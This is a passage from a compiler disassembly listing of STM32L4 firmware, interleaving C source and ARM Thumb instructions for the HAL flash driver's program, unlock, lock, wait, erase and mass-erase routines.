 80014d4:	4b09      	ldr	r3, [pc, #36]	; (80014fc <HAL_FLASH_Program+0xd4>)
 80014d6:	695a      	ldr	r2, [r3, #20]
 80014d8:	693b      	ldr	r3, [r7, #16]
 80014da:	43db      	mvns	r3, r3
 80014dc:	4907      	ldr	r1, [pc, #28]	; (80014fc <HAL_FLASH_Program+0xd4>)
 80014de:	4013      	ands	r3, r2
 80014e0:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80014e2:	f000 f9cf 	bl	8001884 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80014e6:	4b04      	ldr	r3, [pc, #16]	; (80014f8 <HAL_FLASH_Program+0xd0>)
 80014e8:	2200      	movs	r2, #0
 80014ea:	701a      	strb	r2, [r3, #0]

  return status;
 80014ec:	7dfb      	ldrb	r3, [r7, #23]
}
 80014ee:	4618      	mov	r0, r3
 80014f0:	3718      	adds	r7, #24
 80014f2:	46bd      	mov	sp, r7
 80014f4:	bd80      	pop	{r7, pc}
 80014f6:	bf00      	nop
 80014f8:	2000000c 	.word	0x2000000c
 80014fc:	40022000 	.word	0x40022000

08001500 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 8001500:	b480      	push	{r7}
 8001502:	b083      	sub	sp, #12
 8001504:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 8001506:	2300      	movs	r3, #0
 8001508:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800150a:	4b0b      	ldr	r3, [pc, #44]	; (8001538 <HAL_FLASH_Unlock+0x38>)
 800150c:	695b      	ldr	r3, [r3, #20]
 800150e:	2b00      	cmp	r3, #0
 8001510:	da0b      	bge.n	800152a <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 8001512:	4b09      	ldr	r3, [pc, #36]	; (8001538 <HAL_FLASH_Unlock+0x38>)
 8001514:	4a09      	ldr	r2, [pc, #36]	; (800153c <HAL_FLASH_Unlock+0x3c>)
 8001516:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 8001518:	4b07      	ldr	r3, [pc, #28]	; (8001538 <HAL_FLASH_Unlock+0x38>)
 800151a:	4a09      	ldr	r2, [pc, #36]	; (8001540 <HAL_FLASH_Unlock+0x40>)
 800151c:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800151e:	4b06      	ldr	r3, [pc, #24]	; (8001538 <HAL_FLASH_Unlock+0x38>)
 8001520:	695b      	ldr	r3, [r3, #20]
 8001522:	2b00      	cmp	r3, #0
 8001524:	da01      	bge.n	800152a <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 8001526:	2301      	movs	r3, #1
 8001528:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 800152a:	79fb      	ldrb	r3, [r7, #7]
}
 800152c:	4618      	mov	r0, r3
 800152e:	370c      	adds	r7, #12
 8001530:	46bd      	mov	sp, r7
 8001532:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001536:	4770      	bx	lr
 8001538:	40022000 	.word	0x40022000
 800153c:	45670123 	.word	0x45670123
 8001540:	cdef89ab 	.word	0xcdef89ab

08001544 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 8001544:	b480      	push	{r7}
 8001546:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 8001548:	4b05      	ldr	r3, [pc, #20]	; (8001560 <HAL_FLASH_Lock+0x1c>)
 800154a:	695b      	ldr	r3, [r3, #20]
 800154c:	4a04      	ldr	r2, [pc, #16]	; (8001560 <HAL_FLASH_Lock+0x1c>)
 800154e:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 8001552:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 8001554:	2300      	movs	r3, #0
}
 8001556:	4618      	mov	r0, r3
 8001558:	46bd      	mov	sp, r7
 800155a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800155e:	4770      	bx	lr
 8001560:	40022000 	.word	0x40022000

08001564 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 8001564:	b580      	push	{r7, lr}
 8001566:	b084      	sub	sp, #16
 8001568:	af00      	add	r7, sp, #0
 800156a:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 800156c:	f7ff fe1a 	bl	80011a4 <HAL_GetTick>
 8001570:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001572:	e00d      	b.n	8001590 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 8001574:	687b      	ldr	r3, [r7, #4]
 8001576:	f1b3 3fff 	cmp.w	r3, #4294967295
 800157a:	d009      	beq.n	8001590 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 800157c:	f7ff fe12 	bl	80011a4 <HAL_GetTick>
 8001580:	4602      	mov	r2, r0
 8001582:	68fb      	ldr	r3, [r7, #12]
 8001584:	1ad3      	subs	r3, r2, r3
 8001586:	687a      	ldr	r2, [r7, #4]
 8001588:	429a      	cmp	r2, r3
 800158a:	d801      	bhi.n	8001590 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 800158c:	2303      	movs	r3, #3
 800158e:	e036      	b.n	80015fe <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001590:	4b1d      	ldr	r3, [pc, #116]	; (8001608 <FLASH_WaitForLastOperation+0xa4>)
 8001592:	691b      	ldr	r3, [r3, #16]
 8001594:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001598:	2b00      	cmp	r3, #0
 800159a:	d1eb      	bne.n	8001574 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 800159c:	4b1a      	ldr	r3, [pc, #104]	; (8001608 <FLASH_WaitForLastOperation+0xa4>)
 800159e:	691a      	ldr	r2, [r3, #16]
 80015a0:	4b1a      	ldr	r3, [pc, #104]	; (800160c <FLASH_WaitForLastOperation+0xa8>)
 80015a2:	4013      	ands	r3, r2
 80015a4:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 80015a6:	68bb      	ldr	r3, [r7, #8]
 80015a8:	2b00      	cmp	r3, #0
 80015aa:	d01e      	beq.n	80015ea <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 80015ac:	4b18      	ldr	r3, [pc, #96]	; (8001610 <FLASH_WaitForLastOperation+0xac>)
 80015ae:	685a      	ldr	r2, [r3, #4]
 80015b0:	68bb      	ldr	r3, [r7, #8]
 80015b2:	4313      	orrs	r3, r2
 80015b4:	4a16      	ldr	r2, [pc, #88]	; (8001610 <FLASH_WaitForLastOperation+0xac>)
 80015b6:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 80015b8:	68bb      	ldr	r3, [r7, #8]
 80015ba:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 80015be:	2b00      	cmp	r3, #0
 80015c0:	d007      	beq.n	80015d2 <FLASH_WaitForLastOperation+0x6e>
 80015c2:	4b11      	ldr	r3, [pc, #68]	; (8001608 <FLASH_WaitForLastOperation+0xa4>)
 80015c4:	699a      	ldr	r2, [r3, #24]
 80015c6:	68bb      	ldr	r3, [r7, #8]
 80015c8:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 80015cc:	490e      	ldr	r1, [pc, #56]	; (8001608 <FLASH_WaitForLastOperation+0xa4>)
 80015ce:	4313      	orrs	r3, r2
 80015d0:	618b      	str	r3, [r1, #24]
 80015d2:	68bb      	ldr	r3, [r7, #8]
 80015d4:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80015d8:	2b00      	cmp	r3, #0
 80015da:	d004      	beq.n	80015e6 <FLASH_WaitForLastOperation+0x82>
 80015dc:	4a0a      	ldr	r2, [pc, #40]	; (8001608 <FLASH_WaitForLastOperation+0xa4>)
 80015de:	68bb      	ldr	r3, [r7, #8]
 80015e0:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80015e4:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 80015e6:	2301      	movs	r3, #1
 80015e8:	e009      	b.n	80015fe <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 80015ea:	4b07      	ldr	r3, [pc, #28]	; (8001608 <FLASH_WaitForLastOperation+0xa4>)
 80015ec:	691b      	ldr	r3, [r3, #16]
 80015ee:	f003 0301 	and.w	r3, r3, #1
 80015f2:	2b00      	cmp	r3, #0
 80015f4:	d002      	beq.n	80015fc <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 80015f6:	4b04      	ldr	r3, [pc, #16]	; (8001608 <FLASH_WaitForLastOperation+0xa4>)
 80015f8:	2201      	movs	r2, #1
 80015fa:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 80015fc:	2300      	movs	r3, #0
}
 80015fe:	4618      	mov	r0, r3
 8001600:	3710      	adds	r7, #16
 8001602:	46bd      	mov	sp, r7
 8001604:	bd80      	pop	{r7, pc}
 8001606:	bf00      	nop
 8001608:	40022000 	.word	0x40022000
 800160c:	0002c3fa 	.word	0x0002c3fa
 8001610:	2000000c 	.word	0x2000000c

08001614 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 8001614:	b480      	push	{r7}
 8001616:	b085      	sub	sp, #20
 8001618:	af00      	add	r7, sp, #0
 800161a:	60f8      	str	r0, [r7, #12]
 800161c:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 8001620:	4b0e      	ldr	r3, [pc, #56]	; (800165c <FLASH_Program_DoubleWord+0x48>)
 8001622:	695b      	ldr	r3, [r3, #20]
 8001624:	4a0d      	ldr	r2, [pc, #52]	; (800165c <FLASH_Program_DoubleWord+0x48>)
 8001626:	f043 0301 	orr.w	r3, r3, #1
 800162a:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 800162c:	68fb      	ldr	r3, [r7, #12]
 800162e:	683a      	ldr	r2, [r7, #0]
 8001630:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 8001632:	f3bf 8f6f 	isb	sy
}
 8001636:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 8001638:	e9d7 0100 	ldrd	r0, r1, [r7]
 800163c:	f04f 0200 	mov.w	r2, #0
 8001640:	f04f 0300 	mov.w	r3, #0
 8001644:	000a      	movs	r2, r1
 8001646:	2300      	movs	r3, #0
 8001648:	68f9      	ldr	r1, [r7, #12]
 800164a:	3104      	adds	r1, #4
 800164c:	4613      	mov	r3, r2
 800164e:	600b      	str	r3, [r1, #0]
}
 8001650:	bf00      	nop
 8001652:	3714      	adds	r7, #20
 8001654:	46bd      	mov	sp, r7
 8001656:	f85d 7b04 	ldr.w	r7, [sp], #4
 800165a:	4770      	bx	lr
 800165c:	40022000 	.word	0x40022000

08001660 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 8001660:	b480      	push	{r7}
 8001662:	b089      	sub	sp, #36	; 0x24
 8001664:	af00      	add	r7, sp, #0
 8001666:	6078      	str	r0, [r7, #4]
 8001668:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 800166a:	2340      	movs	r3, #64	; 0x40
 800166c:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 800166e:	687b      	ldr	r3, [r7, #4]
 8001670:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 8001672:	683b      	ldr	r3, [r7, #0]
 8001674:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 8001676:	4b14      	ldr	r3, [pc, #80]	; (80016c8 <FLASH_Program_Fast+0x68>)
 8001678:	695b      	ldr	r3, [r3, #20]
 800167a:	4a13      	ldr	r2, [pc, #76]	; (80016c8 <FLASH_Program_Fast+0x68>)
 800167c:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8001680:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 8001682:	f3ef 8310 	mrs	r3, PRIMASK
 8001686:	60fb      	str	r3, [r7, #12]
  return(result);
 8001688:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 800168a:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 800168c:	b672      	cpsid	i
}
 800168e:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 8001690:	697b      	ldr	r3, [r7, #20]
 8001692:	681a      	ldr	r2, [r3, #0]
 8001694:	69bb      	ldr	r3, [r7, #24]
 8001696:	601a      	str	r2, [r3, #0]
    dest_addr++;
 8001698:	69bb      	ldr	r3, [r7, #24]
 800169a:	3304      	adds	r3, #4
 800169c:	61bb      	str	r3, [r7, #24]
    src_addr++;
 800169e:	697b      	ldr	r3, [r7, #20]
 80016a0:	3304      	adds	r3, #4
 80016a2:	617b      	str	r3, [r7, #20]
    row_index--;
 80016a4:	7ffb      	ldrb	r3, [r7, #31]
 80016a6:	3b01      	subs	r3, #1
 80016a8:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 80016aa:	7ffb      	ldrb	r3, [r7, #31]
 80016ac:	2b00      	cmp	r3, #0
 80016ae:	d1ef      	bne.n	8001690 <FLASH_Program_Fast+0x30>
 80016b0:	693b      	ldr	r3, [r7, #16]
 80016b2:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 80016b4:	68bb      	ldr	r3, [r7, #8]
 80016b6:	f383 8810 	msr	PRIMASK, r3
}
 80016ba:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 80016bc:	bf00      	nop
 80016be:	3724      	adds	r7, #36	; 0x24
 80016c0:	46bd      	mov	sp, r7
 80016c2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80016c6:	4770      	bx	lr
 80016c8:	40022000 	.word	0x40022000

080016cc <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 80016cc:	b580      	push	{r7, lr}
 80016ce:	b084      	sub	sp, #16
 80016d0:	af00      	add	r7, sp, #0
 80016d2:	6078      	str	r0, [r7, #4]
 80016d4:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 80016d6:	4b48      	ldr	r3, [pc, #288]	; (80017f8 <HAL_FLASHEx_Erase+0x12c>)
 80016d8:	781b      	ldrb	r3, [r3, #0]
 80016da:	2b01      	cmp	r3, #1
 80016dc:	d101      	bne.n	80016e2 <HAL_FLASHEx_Erase+0x16>
 80016de:	2302      	movs	r3, #2
 80016e0:	e085      	b.n	80017ee <HAL_FLASHEx_Erase+0x122>
 80016e2:	4b45      	ldr	r3, [pc, #276]	; (80017f8 <HAL_FLASHEx_Erase+0x12c>)
 80016e4:	2201      	movs	r2, #1
 80016e6:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80016e8:	f24c 3050 	movw	r0, #50000	; 0xc350
 80016ec:	f7ff ff3a 	bl	8001564 <FLASH_WaitForLastOperation>
 80016f0:	4603      	mov	r3, r0
 80016f2:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 80016f4:	7bfb      	ldrb	r3, [r7, #15]
 80016f6:	2b00      	cmp	r3, #0
 80016f8:	d175      	bne.n	80017e6 <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80016fa:	4b3f      	ldr	r3, [pc, #252]	; (80017f8 <HAL_FLASHEx_Erase+0x12c>)
 80016fc:	2200      	movs	r2, #0
 80016fe:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 8001700:	4b3e      	ldr	r3, [pc, #248]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 8001702:	681b      	ldr	r3, [r3, #0]
 8001704:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8001708:	2b00      	cmp	r3, #0
 800170a:	d013      	beq.n	8001734 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 800170c:	4b3b      	ldr	r3, [pc, #236]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 800170e:	681b      	ldr	r3, [r3, #0]
 8001710:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001714:	2b00      	cmp	r3, #0
 8001716:	d009      	beq.n	800172c <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 8001718:	4b38      	ldr	r3, [pc, #224]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 800171a:	681b      	ldr	r3, [r3, #0]
 800171c:	4a37      	ldr	r2, [pc, #220]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 800171e:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001722:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 8001724:	4b34      	ldr	r3, [pc, #208]	; (80017f8 <HAL_FLASHEx_Erase+0x12c>)
 8001726:	2203      	movs	r2, #3
 8001728:	771a      	strb	r2, [r3, #28]
 800172a:	e016      	b.n	800175a <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 800172c:	4b32      	ldr	r3, [pc, #200]	; (80017f8 <HAL_FLASHEx_Erase+0x12c>)
 800172e:	2201      	movs	r2, #1
 8001730:	771a      	strb	r2, [r3, #28]
 8001732:	e012      	b.n	800175a <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001734:	4b31      	ldr	r3, [pc, #196]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 8001736:	681b      	ldr	r3, [r3, #0]
 8001738:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800173c:	2b00      	cmp	r3, #0
 800173e:	d009      	beq.n	8001754 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001740:	4b2e      	ldr	r3, [pc, #184]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 8001742:	681b      	ldr	r3, [r3, #0]
 8001744:	4a2d      	ldr	r2, [pc, #180]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 8001746:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800174a:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 800174c:	4b2a      	ldr	r3, [pc, #168]	; (80017f8 <HAL_FLASHEx_Erase+0x12c>)
 800174e:	2202      	movs	r2, #2
 8001750:	771a      	strb	r2, [r3, #28]
 8001752:	e002      	b.n	800175a <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001754:	4b28      	ldr	r3, [pc, #160]	; (80017f8 <HAL_FLASHEx_Erase+0x12c>)
 8001756:	2200      	movs	r2, #0
 8001758:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 800175a:	687b      	ldr	r3, [r7, #4]
 800175c:	681b      	ldr	r3, [r3, #0]
 800175e:	2b01      	cmp	r3, #1
 8001760:	d111      	bne.n	8001786 <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 8001762:	687b      	ldr	r3, [r7, #4]
 8001764:	685b      	ldr	r3, [r3, #4]
 8001766:	4618      	mov	r0, r3
 8001768:	f000 f84a 	bl	8001800 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800176c:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001770:	f7ff fef8 	bl	8001564 <FLASH_WaitForLastOperation>
 8001774:	4603      	mov	r3, r0
 8001776:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 8001778:	4b20      	ldr	r3, [pc, #128]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 800177a:	695b      	ldr	r3, [r3, #20]
 800177c:	4a1f      	ldr	r2, [pc, #124]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 800177e:	f023 0304 	bic.w	r3, r3, #4
 8001782:	6153      	str	r3, [r2, #20]
 8001784:	e02d      	b.n	80017e2 <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 8001786:	683b      	ldr	r3, [r7, #0]
 8001788:	f04f 32ff 	mov.w	r2, #4294967295
 800178c:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 800178e:	687b      	ldr	r3, [r7, #4]
 8001790:	689b      	ldr	r3, [r3, #8]
 8001792:	60bb      	str	r3, [r7, #8]
 8001794:	e01d      	b.n	80017d2 <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 8001796:	687b      	ldr	r3, [r7, #4]
 8001798:	685b      	ldr	r3, [r3, #4]
 800179a:	4619      	mov	r1, r3
 800179c:	68b8      	ldr	r0, [r7, #8]
 800179e:	f000 f84d 	bl	800183c <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80017a2:	f24c 3050 	movw	r0, #50000	; 0xc350
 80017a6:	f7ff fedd 	bl	8001564 <FLASH_WaitForLastOperation>
 80017aa:	4603      	mov	r3, r0
 80017ac:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 80017ae:	4b13      	ldr	r3, [pc, #76]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 80017b0:	695b      	ldr	r3, [r3, #20]
 80017b2:	4a12      	ldr	r2, [pc, #72]	; (80017fc <HAL_FLASHEx_Erase+0x130>)
 80017b4:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 80017b8:	f023 0302 	bic.w	r3, r3, #2
 80017bc:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 80017be:	7bfb      	ldrb	r3, [r7, #15]
 80017c0:	2b00      	cmp	r3, #0
 80017c2:	d003      	beq.n	80017cc <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 80017c4:	683b      	ldr	r3, [r7, #0]
 80017c6:	68ba      	ldr	r2, [r7, #8]
 80017c8:	601a      	str	r2, [r3, #0]
          break;
 80017ca:	e00a      	b.n	80017e2 <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80017cc:	68bb      	ldr	r3, [r7, #8]
 80017ce:	3301      	adds	r3, #1
 80017d0:	60bb      	str	r3, [r7, #8]
 80017d2:	687b      	ldr	r3, [r7, #4]
 80017d4:	689a      	ldr	r2, [r3, #8]
 80017d6:	687b      	ldr	r3, [r7, #4]
 80017d8:	68db      	ldr	r3, [r3, #12]
 80017da:	4413      	add	r3, r2
 80017dc:	68ba      	ldr	r2, [r7, #8]
 80017de:	429a      	cmp	r2, r3
 80017e0:	d3d9      	bcc.n	8001796 <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80017e2:	f000 f84f 	bl	8001884 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80017e6:	4b04      	ldr	r3, [pc, #16]	; (80017f8 <HAL_FLASHEx_Erase+0x12c>)
 80017e8:	2200      	movs	r2, #0
 80017ea:	701a      	strb	r2, [r3, #0]

  return status;
 80017ec:	7bfb      	ldrb	r3, [r7, #15]
}
 80017ee:	4618      	mov	r0, r3
 80017f0:	3710      	adds	r7, #16
 80017f2:	46bd      	mov	sp, r7
 80017f4:	bd80      	pop	{r7, pc}
 80017f6:	bf00      	nop
 80017f8:	2000000c 	.word	0x2000000c
 80017fc:	40022000 	.word	0x40022000

08001800 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 8001800:	b480      	push	{r7}
 8001802:	b083      	sub	sp, #12
 8001804:	af00      	add	r7, sp, #0
 8001806:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 8001808:	687b      	ldr	r3, [r7, #4]
 800180a:	f003 0301 	and.w	r3, r3, #1
 800180e:	2b00      	cmp	r3, #0
 8001810:	d005      	beq.n	800181e <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 8001812:	4b09      	ldr	r3, [pc, #36]	; (8001838 <FLASH_MassErase+0x38>)
 8001814:	695b      	ldr	r3, [r3, #20]
 8001816:	4a08      	ldr	r2, [pc, #32]	; (8001838 <FLASH_MassErase+0x38>)
 8001818:	f043 0304 	orr.w	r3, r3, #4
 800181c:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 800181e:	4b06      	ldr	r3, [pc, #24]	; (8001838 <FLASH_MassErase+0x38>)
 8001820:	695b      	ldr	r3, [r3, #20]
 8001822:	4a05      	ldr	r2, [pc, #20]	; (8001838 <FLASH_MassErase+0x38>)
 8001824:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001828:	6153      	str	r3, [r2, #20]
}
 800182a:	bf00      	nop
 800182c:	370c      	adds	r7, #12
 800182e:	46bd      	mov	sp, r7
 8001830:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001834:	4770      	bx	lr
 8001836:	bf00      	nop
 8001838:	40022000 	.word	0x40022000

